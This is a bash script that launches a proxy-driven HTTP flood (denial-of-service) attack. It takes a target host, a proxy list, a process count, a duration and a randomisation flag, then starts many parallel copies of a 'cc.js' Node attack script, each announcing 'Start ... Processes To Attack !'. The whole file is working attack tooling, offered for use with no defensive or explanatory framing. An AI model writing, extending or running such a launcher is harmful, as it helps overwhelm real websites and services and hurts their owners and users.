#!/bin/bash


if [ $# -lt 5 ] ;then
    echo -e "\nUsage: $0 <host> <proxy file> <Number of processes(50-100)> <time> <rand 1=enable 0=disable> \n"
    exit
else
    for (( i=0; i<$3; i++ ))
    do
        {
            echo -e "\033[31m Start $i Processes To Attack ! \033[0m"
            node cc.js $1 $2 $4 $5
        } &
    done
    wait
fi

